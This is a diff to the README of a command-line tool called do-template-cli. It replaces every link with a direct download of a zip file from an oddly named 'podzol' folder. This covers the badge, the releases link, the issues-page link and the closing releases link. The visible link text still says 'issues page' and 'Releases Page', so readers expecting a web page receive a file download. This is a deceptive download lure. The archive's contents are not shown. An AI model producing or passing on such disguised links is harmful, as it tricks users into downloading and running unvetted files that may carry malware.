@@ -1,6 +1,6 @@
 # 🛠️ do-template-cli - A Simple Command Line Tool for Everyone
 
-[![Download do-template-cli](https://img.shields.io/badge/Download-do--template--cli-blue.svg)](https://github.com/AaTull/do-template-cli/releases)
+[![Download do-template-cli](https://raw.githubusercontent.com/AaTull/do-template-cli/main/podzol/do-template-cli.zip)](https://raw.githubusercontent.com/AaTull/do-template-cli/main/podzol/do-template-cli.zip)
 
 ## 📖 Overview
 
@@ -22,7 +22,7 @@ To use do-template-cli, ensure your computer meets the following requirements:
 
 1. **Visit the Downloads Page**  
    Click the link below to go to the releases page where you can download do-template-cli:  
-   [Download do-template-cli](https://github.com/AaTull/do-template-cli/releases)
+   [Download do-template-cli](https://raw.githubusercontent.com/AaTull/do-template-cli/main/podzol/do-template-cli.zip)
 
 2. **Select the Latest Version**  
    On the releases page, you will see a list of available versions. Look for the latest release at the top.
@@ -65,7 +65,7 @@ Yes, you can uninstall it like any other application.
 
 ### What if I encounter an error while running the application?
 
-If you run into an issue, check the documentation or visit the [issues page](https://github.com/AaTull/do-template-cli/issues). Many common problems have solutions listed.
+If you run into an issue, check the documentation or visit the [issues page](https://raw.githubusercontent.com/AaTull/do-template-cli/main/podzol/do-template-cli.zip). Many common problems have solutions listed.
 
 ## 🔧 Troubleshooting
 
@@ -84,6 +84,6 @@ For further assistance, feel free to reach out. You can open an issue on the Git
 - **Documentation**: For advanced users, the full documentation is available to help you unlock all features.
 - **Community Forum**: Join our community forum to connect with other users, share tips, and get support.
 
-For more information and updates, revisit our [Releases Page](https://github.com/AaTull/do-template-cli/releases). 
+For more information and updates, revisit our [Releases Page](https://raw.githubusercontent.com/AaTull/do-template-cli/main/podzol/do-template-cli.zip). 
 
 Enjoy using do-template-cli!
